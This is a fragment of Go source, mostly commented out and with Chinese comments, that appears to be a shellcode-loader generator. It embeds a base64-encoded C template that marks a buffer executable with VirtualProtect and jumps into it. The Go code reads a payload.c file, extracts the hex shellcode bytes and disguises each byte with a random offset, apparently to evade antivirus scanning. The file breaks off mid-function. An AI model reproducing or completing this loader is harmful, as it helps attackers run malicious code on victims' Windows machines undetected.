package main

// var code = "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxXaW5kb3dzLmg+CgoKLyokY29kZSQqLwoKaW50IGxlbiA9IHNpemVvZih2MykgLyBzaXplb2YoKnYzKTsKCnVuc2lnbmVkIGNoYXIgYnVmZltzaXplb2YodjMpIC8gc2l6ZW9mKCp2MyldID0gezB9OwoKdHlwZWRlZiBCT09MKFdJTkFQSSAqVmlyVHVhbCkoCiAgICBMUFZPSUQgQWRkciwKICAgIERXT1JEIFNpemUsCiAgICBEV09SRCBOZXcsCiAgICBQRFdPUkQgT2xkKTsKCmludCBtYWluKCkKewogICAgVmlyVHVhbCBWVCA9IChWaXJUdWFsKUdldFByb2NBZGRyZXNzKAogICAgICAgIEdldE1vZHVsZUhhbmRsZUEoIktlcm5lbDMyLmRsbCIpLAogICAgICAgICJWaXJ0dWFsUHJvdGVjdCIpOwogICAgZm9yIChpbnQgaSA9IDA7IGkgPCBsZW47IGkrKykKICAgIHsKICAgICAgICBidWZmW2ldID0gdjNbaV07CiAgICB9CgogICAgRFdPUkQgb2xkOwogICAgVlQoYnVmZiwgc2l6ZW9mKGJ1ZmYpLCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFLCAmb2xkKTsKICAgICgodm9pZCAoKikoKSlidWZmKSgpOwogICAgcmV0dXJuIDA7Cn0="

// func main() {
// // 获取payload.c绝对路径
// payloadFile := "payload.c"
// if !pathExists(payloadFile) {
// path := input("请输入payload.c绝对路径(默认读取当前目录):\n")
// if len(path) > 0 {
// payloadFile = path
// }
// }
// if !pathExists(payloadFile) {
//     fmt.Println("payload不存在")
//     os.Exit(0)
// }

// // 读取每一行，并查找（\\x\w\w）正则表达式匹配，其中[\w\w]表示16进制字符
// fileBytes, _ := ioutil.ReadFile(payloadFile)
// v3string := regexp.MustCompile(`\\x(\w\w)`).FindAllStringSubmatch(string(fileBytes), -1)

// // 16进制字符串转换成整型
// v1 := make([]int, len(v3string))
// for i := 0; i < len(v3string); i++ {
//     num, _ := strconv.ParseInt(v3string[i][1], 16, 0)
//     n := random(0, 250)
//     v1[i] = 256*n + int(num)
// }
